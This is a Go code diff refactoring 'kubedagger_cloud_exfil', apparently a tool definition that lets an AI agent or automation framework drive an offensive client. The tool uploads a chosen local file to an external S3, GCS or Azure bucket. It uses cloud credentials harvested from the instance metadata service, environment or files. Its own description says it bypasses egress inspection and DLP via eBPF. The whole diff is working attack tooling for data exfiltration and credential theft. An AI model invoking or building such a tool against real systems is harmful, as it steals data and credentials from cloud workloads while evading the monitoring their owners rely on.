@@ -11,12 +11,10 @@ import (
 )
 
 type CloudExfilInput struct {
-	Method      string `json:"method"`
-	Destination string `json:"destination,omitempty"`
-	Source      string `json:"source,omitempty"`
-	BucketName  string `json:"bucket_name,omitempty"`
-	Region      string `json:"region,omitempty"`
-	ChunkSize   int    `json:"chunk_size,omitempty"`
+	Provider  string `json:"provider,omitempty"`
+	Bucket    string `json:"bucket,omitempty"`
+	Path      string `json:"path,omitempty"`
+	CredsFrom string `json:"creds_from,omitempty"`
 }
 
 type CloudExfilTool struct {
@@ -30,40 +28,32 @@ func NewCloudExfil(exec executor.Executor) *CloudExfilTool {
 func (t *CloudExfilTool) Name() string { return "kubedagger_cloud_exfil" }
 
 func (t *CloudExfilTool) Description() string {
-	return "Exfiltrate data to cloud storage using stolen cloud credentials. Supports S3, GCS, and Azure Blob Storage. Uses eBPF to bypass egress network policies and DLP inspection."
+	return "Exfiltrate a local file to cloud object storage (S3, GCS, Azure Blob) using credentials harvested from the instance. Uploads the file at the given path to the specified bucket, bypassing egress inspection via eBPF."
 }
 
 func (t *CloudExfilTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"method": {
+			"provider": {
 				"type": "string",
-				"enum": ["s3", "gcs", "azure-blob", "dns", "https"],
-				"description": "Exfiltration method/destination type"
+				"enum": ["aws", "gcp", "azure"],
+				"description": "Cloud provider for the destination bucket (default: aws)"
 			},
-			"destination": {
+			"bucket": {
 				"type": "string",
-				"description": "Destination URL or identifier"
+				"description": "Destination bucket name"
 			},
-			"source": {
+			"path": {
 				"type": "string",
-				"description": "Source path or data identifier to exfiltrate"
+				"description": "Local file path to exfiltrate"
 			},
-			"bucket_name": {
+			"creds_from": {
 				"type": "string",
-				"description": "Cloud storage bucket name"
-			},
-			"region": {
-				"type": "string",
-				"description": "Cloud region for the storage bucket"
-			},
-			"chunk_size": {
-				"type": "integer",
-				"description": "Chunk size in bytes for split transfer"
+				"enum": ["imds", "env", "file"],
+				"description": "Where to obtain cloud credentials (default: imds)"
 			}
-		},
-		"required": ["method"]
+		}
 	}`)
 }
 
@@ -73,31 +63,25 @@ func (t *CloudExfilTool) Execute(ctx context.Context, params json.RawMessage) (*
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Destination, "destination"); err != nil {
+	if err := validateSafeString(input.Bucket, "bucket"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Source, "source"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.BucketName, "bucket_name"); err != nil {
+	if err := validateSafeString(input.Path, "path"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"cloud", "exfil", "--method", input.Method}
-	if input.Destination != "" {
-		args = append(args, "--destination", input.Destination)
+	args := []string{"cloud", "exfil"}
+	if input.Provider != "" {
+		args = append(args, "--provider", input.Provider)
 	}
-	if input.Source != "" {
-		args = append(args, "--source", input.Source)
+	if input.Bucket != "" {
+		args = append(args, "--bucket", input.Bucket)
 	}
-	if input.BucketName != "" {
-		args = append(args, "--bucket", input.BucketName)
+	if input.Path != "" {
+		args = append(args, "--path", input.Path)
 	}
-	if input.Region != "" {
-		args = append(args, "--region", input.Region)
-	}
-	if input.ChunkSize > 0 {
-		args = append(args, "--chunk-size", fmt.Sprintf("%d", input.ChunkSize))
+	if input.CredsFrom != "" {
+		args = append(args, "--creds-from", input.CredsFrom)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -111,7 +95,11 @@ func (t *CloudExfilTool) Execute(ctx context.Context, params json.RawMessage) (*
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Cloud Exfiltration: %s\n\n", input.Method)
+	provider := input.Provider
+	if provider == "" {
+		provider = "aws"
+	}
+	fmt.Fprintf(&sb, "## KubeDagger Cloud Exfiltration: %s\n\n", provider)
 	if output == "" {
 		sb.WriteString("Exfiltration complete.\n")
 	} else {
